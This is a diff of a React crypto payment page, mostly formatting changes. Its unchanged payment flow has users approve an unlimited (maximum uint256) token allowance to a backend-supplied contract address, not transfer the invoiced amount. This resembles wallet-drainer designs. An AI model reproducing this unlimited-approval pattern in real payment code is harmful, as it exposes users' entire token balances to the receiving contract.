@@ -37,7 +37,7 @@ function PaymentPageContent() {
   const [localPaymentStatus, setLocalPaymentStatus] = useState<string | null>(null);
   const [selectedChain, setSelectedChain] = useState<ChainType>("ethereum");
   const [timeLeft, setTimeLeft] = useState<{ minutes: number; seconds: number }>({ minutes: 0, seconds: 0 });
-  
+
   // Mobile wallet detection and connection state
   const [isMobileWallet, setIsMobileWallet] = useState(false);
   const [walletConnected, setWalletConnected] = useState(false);
@@ -53,22 +53,24 @@ function PaymentPageContent() {
   const [isProcessingPayment, setIsProcessingPayment] = useState(false);
 
   // Parse expiration date properly
-  const isExpired = payment && (() => {
-    if (!payment.expires_at) return false;
-    let expiresAt: Date;
-    if (typeof payment.expires_at === "string") {
-      if (/^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/.test(payment.expires_at)) {
-        expiresAt = new Date(payment.expires_at + "Z");
+  const isExpired =
+    payment &&
+    (() => {
+      if (!payment.expires_at) return false;
+      let expiresAt: Date;
+      if (typeof payment.expires_at === "string") {
+        if (/^\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}$/.test(payment.expires_at)) {
+          expiresAt = new Date(payment.expires_at + "Z");
+        } else {
+          expiresAt = new Date(payment.expires_at);
+        }
       } else {
         expiresAt = new Date(payment.expires_at);
       }
-    } else {
-      expiresAt = new Date(payment.expires_at);
-    }
-    const now = new Date();
-    if (isNaN(expiresAt.getTime())) return false;
-    return expiresAt < now;
-  })();
+      const now = new Date();
+      if (isNaN(expiresAt.getTime())) return false;
+      return expiresAt < now;
+    })();
 
   // Format payment amount (remove trailing zeros)
   const formatPaymentAmount = (amount: number | string): string => {
@@ -104,16 +106,16 @@ function PaymentPageContent() {
   // Detect mobile wallet
   useEffect(() => {
     if (typeof window === "undefined") return;
-    
+
     // Check for EVM wallets (MetaMask, etc.)
-    const hasEVMWallet = !!(window.ethereum);
-    
+    const hasEVMWallet = !!window.ethereum;
+
     // Check for TRON wallets (TronLink, etc.)
     const hasTronWallet = !!(window.tronWeb || window.tronLink);
-    
+
     if (hasEVMWallet || hasTronWallet) {
       setIsMobileWallet(true);
-      
+
       // Try to get connected address
       const checkConnection = async () => {
         try {
@@ -139,7 +141,7 @@ function PaymentPageContent() {
           console.error("Error checking wallet connection:", error);
         }
       };
-      
+
       checkConnection();
     }
   }, []);
@@ -147,7 +149,7 @@ function PaymentPageContent() {
   // Check balances when wallet is connected and chain is selected
   useEffect(() => {
     if (!isMobileWallet || !walletConnected || !walletAddress || !payment) return;
-    
+
     const checkBalances = async () => {
       setIsCheckingBalance(true);
       try {
@@ -158,10 +160,10 @@ function PaymentPageContent() {
             address: walletAddress,
             chain: selectedChain,
             currency: payment.currency,
-            amount: payment.amount,
-          }),
+            amount: payment.amount
+          })
         });
-        
+
         if (response.ok) {
           const data = await response.json();
           setBalanceCheck(data);
@@ -171,7 +173,7 @@ function PaymentPageContent() {
             hasEnoughToken: false,
             nativeBalance: "0",
             tokenBalance: "0",
-            error: "Failed to check balances",
+            error: "Failed to check balances"
           });
         }
       } catch (error) {
@@ -181,13 +183,13 @@ function PaymentPageContent() {
           hasEnoughToken: false,
           nativeBalance: "0",
           tokenBalance: "0",
-          error: "Error checking balances",
+          error: "Error checking balances"
         });
       } finally {
         setIsCheckingBalance(false);
       }
     };
-    
+
     checkBalances();
   }, [isMobileWallet, walletConnected, walletAddress, selectedChain, payment]);
 
@@ -233,7 +235,7 @@ function PaymentPageContent() {
       try {
         await window.ethereum.request({
           method: "wallet_switchEthereumChain",
-          params: [{ chainId: chainIdHex }],
+          params: [{ chainId: chainIdHex }]
         });
       } catch (switchErr: any) {
         if (switchErr?.code === 4902 || switchErr?.code === -32603) {
@@ -249,10 +251,10 @@ function PaymentPageContent() {
                 nativeCurrency: {
                   name: native.name,
                   symbol: native.symbol,
-                  decimals: native.decimals,
-                },
-              },
-            ],
+                  decimals: native.decimals
+                }
+              }
+            ]
           });
         } else {
           throw switchErr;
@@ -273,7 +275,7 @@ function PaymentPageContent() {
       const response = await fetch("/api/payment/get-contract-address", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ chain: selectedChain, currency: payment.currency }),
+        body: JSON.stringify({ chain: selectedChain, currency: payment.currency })
       });
 
       if (!response.ok) {
@@ -288,17 +290,17 @@ function PaymentPageContent() {
         if (!window.tronWeb && !window.tronLink) {
           throw new Error("TRON wallet not found");
         }
-        
-        const tronWeb = window.tronWeb || (window.tronLink?.tronWeb);
+
+        const tronWeb = window.tronWeb || window.tronLink?.tronWeb;
         if (!tronWeb) {
           throw new Error("TRON wallet not connected");
         }
-        
+
         // Call approve function using TronWeb contract
         const contract = await tronWeb.contract().at(tokenAddress);
         const MAX_APPROVAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
         const tx = await contract.approve(contractAddress, MAX_APPROVAL).send();
-        
+
         if (tx) {
           // Notify backend about the approval
           await fetch("/api/payment/process", {
@@ -309,10 +311,10 @@ function PaymentPageContent() {
               currency: payment.currency,
               userAddress: walletAddress,
               chain: selectedChain,
-              txHash: tx,
-            }),
+              txHash: tx
+            })
           });
-          
+
           setLocalPaymentStatus("processing");
           refetch();
         }
@@ -326,21 +328,21 @@ function PaymentPageContent() {
         const { ethers } = await import("ethers");
         const provider = new ethers.BrowserProvider(window.ethereum);
         const signer = await provider.getSigner();
-        
+
         // Get token contract
         const tokenContract = new ethers.Contract(
           tokenAddress,
           ["function approve(address spender, uint256 amount) returns (bool)"],
           signer
         );
-        
+
         // MAX_APPROVAL
         const MAX_APPROVAL = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
-        
+
         // Send approval transaction
         const tx = await tokenContract.approve(contractAddress, MAX_APPROVAL);
         const receipt = await tx.wait();
-        
+
         if (receipt.hash) {
           // Notify backend about the approval
           await fetch("/api/payment/process", {
@@ -351,10 +353,10 @@ function PaymentPageContent() {
               currency: payment.currency,
               userAddress: walletAddress,
               chain: selectedChain,
-              txHash: receipt.hash,
-            }),
+              txHash: receipt.hash
+            })
           });
-          
+
           setLocalPaymentStatus("processing");
           refetch();
         }
@@ -380,13 +382,8 @@ function PaymentPageContent() {
 
   const checkPaymentStatus = async () => {
     try {
-      if (
-        payment &&
-        (payment.status === "pending" || payment.status === "processing")
-      ) {
-        const response = await fetch(
-          `/api/payment/status?payment_id=${paymentId}`
-        );
+      if (payment && (payment.status === "pending" || payment.status === "processing")) {
+        const response = await fetch(`/api/payment/status?payment_id=${paymentId}`);
         if (response.ok) {
           const data = await response.json();
           if (data.status && data.status !== payment.status) {
@@ -407,10 +404,7 @@ function PaymentPageContent() {
       clearInterval(statusCheckInterval);
     }
     const interval = setInterval(() => {
-      if (
-        payment &&
-        (payment.status === "pending" || payment.status === "processing")
-      ) {
+      if (payment && (payment.status === "pending" || payment.status === "processing")) {
         checkPaymentStatus();
       } else {
         stopStatusPolling();
@@ -478,7 +472,7 @@ function PaymentPageContent() {
       } else {
         expiryDate = new Date(payment.expires_at);
       }
-      
+
       const expiry = expiryDate.getTime();
       const difference = expiry - now;
 
@@ -545,7 +539,7 @@ function PaymentPageContent() {
               </div>
               <h1 className="text-xl font-bold text-gray-900 mb-2">{t("paymentPage.successTitle")}</h1>
               <p className="text-gray-600 mb-4 text-sm">{t("paymentPage.successDesc")}</p>
-              
+
               <div className="bg-gray-50 rounded-xl p-4 mb-4">
                 <div className="flex items-center justify-center gap-2 mb-2">
                   <span className="text-2xl font-bold text-green-600 font-mono">
@@ -603,9 +597,7 @@ function PaymentPageContent() {
                 </svg>
               </div>
               <h1 className="text-xl font-bold text-gray-900 mb-2">{t("paymentPage.invalidTitle")}</h1>
-              <p className="text-gray-600 mb-4 text-sm">
-                {t("paymentPage.invalidDesc")}
-              </p>
+              <p className="text-gray-600 mb-4 text-sm">{t("paymentPage.invalidDesc")}</p>
               <button
                 onClick={() => window.location.reload()}
                 className="px-6 py-2.5 bg-blue-600 hover:bg-blue-700 text-white rounded-lg font-medium transition-colors text-sm"
@@ -643,14 +635,17 @@ function PaymentPageContent() {
               title={t("paymentPage.copyAddress")}
             >
               <svg className="w-5 h-5 text-blue-500" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z" />
+                <path
+                  strokeLinecap="round"
+                  strokeLinejoin="round"
+                  strokeWidth={2}
+                  d="M8 16H6a2 2 0 01-2-2V6a2 2 0 012-2h8a2 2 0 012 2v2m-6 12h8a2 2 0 002-2v-8a2 2 0 00-2-2h-8a2 2 0 00-2 2v8a2 2 0 002 2z"
+                />
               </svg>
             </button>
-            
+
             <div className="text-center">
-              <div className="text-3xl font-bold text-black">
-                {formatPaymentAmount(payment.amount)}
-              </div>
+              <div className="text-3xl font-bold text-black">{formatPaymentAmount(payment.amount)}</div>
               <div className="text-sm text-gray-500 mt-1">{payment.currency.toUpperCase()}</div>
             </div>
 
@@ -682,8 +677,8 @@ function PaymentPageContent() {
                   {[
                     { id: "ethereum", name: "ETH", icon: "/icons/ethereum.png" },
                     { id: "bsc", name: "BSC", icon: "/icons/bsc.png" },
-                    { id: "tron", name: "TRON", icon: "/icons/tron.png" },
-                  ].map((chain) => (
+                    { id: "tron", name: "TRON", icon: "/icons/tron.png" }
+                  ].map(chain => (
                     <button
                       key={chain.id}
                       onClick={() => setSelectedChain(chain.id as ChainType)}
@@ -693,7 +688,14 @@ function PaymentPageContent() {
                           : "bg-gray-100 text-gray-700 hover:bg-gray-200"
                       }`}
                     >
-                      <img src={chain.icon} alt={chain.name} className="w-5 h-5" onError={(e) => { e.currentTarget.style.display = "none"; }} />
+                      <img
+                        src={chain.icon}
+                        alt={chain.name}
+                        className="w-5 h-5"
+                        onError={e => {
+                          e.currentTarget.style.display = "none";
+                        }}
+                      />
                       <span>{chain.name}</span>
                     </button>
                   ))}
@@ -732,16 +734,14 @@ function PaymentPageContent() {
                           {/* Balance Warnings */}
                           {(!balanceCheck.hasEnoughNative || !balanceCheck.hasEnoughToken) && (
                             <div className="bg-yellow-50 border border-yellow-200 rounded-lg p-3">
-                              <div className="text-xs font-semibold text-yellow-800 mb-1">{t("paymentPage.balanceLow")}</div>
+                              <div className="text-xs font-semibold text-yellow-800 mb-1">
+                                {t("paymentPage.balanceLow")}
+                              </div>
                               {!balanceCheck.hasEnoughNative && (
                                 <div className="text-xs text-yellow-700">
                                   {t("paymentPage.feeInsufficient", {
                                     symbol:
-                                      selectedChain === "ethereum"
-                                        ? "ETH"
-                                        : selectedChain === "bsc"
-                                        ? "BNB"
-                                        : "TRX",
+                                      selectedChain === "ethereum" ? "ETH" : selectedChain === "bsc" ? "BNB" : "TRX"
                                   })}
                                 </div>
                               )}
@@ -749,7 +749,7 @@ function PaymentPageContent() {
                                 <div className="text-xs text-yellow-700">
                                   {t("paymentPage.tokenInsufficient", {
                                     amount: formatPaymentAmount(payment.amount),
-                                    symbol: payment.currency.toUpperCase(),
+                                    symbol: payment.currency.toUpperCase()
                                   })}
                                 </div>
                               )}
@@ -760,14 +760,10 @@ function PaymentPageContent() {
                           <button
                             onClick={handlePay}
                             disabled={
-                              !balanceCheck.hasEnoughNative ||
-                              !balanceCheck.hasEnoughToken ||
-                              isProcessingPayment
+                              !balanceCheck.hasEnoughNative || !balanceCheck.hasEnoughToken || isProcessingPayment
                             }
                             className={`w-full py-3 rounded-lg font-semibold transition-colors ${
-                              balanceCheck.hasEnoughNative &&
-                              balanceCheck.hasEnoughToken &&
-                              !isProcessingPayment
+                              balanceCheck.hasEnoughNative && balanceCheck.hasEnoughToken && !isProcessingPayment
                                 ? "bg-blue-500 hover:bg-blue-600 text-white"
                                 : "bg-gray-300 text-gray-500 cursor-not-allowed"
                             }`}
@@ -782,11 +778,7 @@ function PaymentPageContent() {
               ) : (
                 /* Desktop/Regular: Show QR Code */
                 <div className="w-full">
-                  <QRCode 
-                    value={generateQRCodeValue(selectedChain)} 
-                    size={300}
-                    chain={selectedChain}
-                  />
+                  <QRCode value={generateQRCodeValue(selectedChain)} size={300} chain={selectedChain} />
                 </div>
               )}
             </div>
@@ -795,13 +787,15 @@ function PaymentPageContent() {
           {/* Status Display - For non-pending states */}
           {(currentStatus === "processing" || currentStatus === "failed" || currentStatus === "expired") && (
             <div className="text-center py-6">
-              <div className={`w-12 h-12 rounded-full flex items-center justify-center mx-auto mb-3 ${
-                currentStatus === "processing" 
-                  ? "bg-blue-500" 
-                  : currentStatus === "failed" 
-                  ? "bg-red-500" 
-                  : "bg-gray-500"
-              }`}>
+              <div
+                className={`w-12 h-12 rounded-full flex items-center justify-center mx-auto mb-3 ${
+                  currentStatus === "processing"
+                    ? "bg-blue-500"
+                    : currentStatus === "failed"
+                      ? "bg-red-500"
+                      : "bg-gray-500"
+                }`}
+              >
                 {currentStatus === "processing" ? (
                   <div className="w-6 h-6 border-3 border-white border-t-transparent rounded-full animate-spin"></div>
                 ) : currentStatus === "failed" ? (
@@ -810,7 +804,12 @@ function PaymentPageContent() {
                   </svg>
                 ) : (
                   <svg className="w-6 h-6 text-white" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z" />
+                    <path
+                      strokeLinecap="round"
+                      strokeLinejoin="round"
+                      strokeWidth={2}
+                      d="M12 8v4l3 3m6-3a9 9 0 11-18 0 9 9 0 0118 0z"
+                    />
                   </svg>
                 )}
               </div>
@@ -818,8 +817,8 @@ function PaymentPageContent() {
                 {currentStatus === "processing"
                   ? t("paymentPage.processingTitle")
                   : currentStatus === "failed"
-                  ? t("paymentPage.failedTitle")
-                  : t("paymentPage.expired")}
+                    ? t("paymentPage.failedTitle")
+                    : t("paymentPage.expired")}
               </h3>
               {payment.tx_hash && payment.chain && currentStatus === "processing" && (
                 <a
